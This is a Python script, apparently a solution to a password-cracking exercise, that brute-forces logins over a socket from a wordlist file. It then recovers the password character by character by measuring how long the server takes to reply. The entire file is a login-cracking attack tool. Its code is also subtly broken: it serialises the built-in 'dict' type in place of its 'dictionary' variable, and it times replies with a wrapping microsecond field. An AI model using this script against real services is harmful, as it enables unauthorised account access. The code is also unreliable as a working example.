import sys, socket, json, datetime

host, port = sys.argv[1:]

letters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
with socket.socket() as client_socket:
    client_socket.connect((host, int(port)))
    dictionary = {}
    with open('logins.txt', 'r') as login_file:

        for line in login_file:
            line = line.strip("\n")
            dictionary["login"] = line
            dictionary["password"] = ' '
            ms = json.dumps(dict, indent=4)
            client_socket.send(ms.encode())
            if json.loads(client_socket.recv(1024).decode())["result"] == "Wrong password!":
                password = ""
                break
        dictionary["password"] = ''
    while True:
        for i in letters:
            dictionary["password"] += i
            ms = json.dumps(dict, indent=4)
            client_socket.send(ms.encode())
            start = datetime.datetime.now().microsecond
            res = json.loads(client_socket.recv(1024).decode())
            finish = datetime.datetime.now().microsecond
            if res["result"] == "Connection success!":
                print(json.dumps(dict))
                exit()
            if finish - start > 9000 and res["result"] == "Wrong password!":
                pass
            else:
                dictionary["password"] = dictionary["password"][:-1]
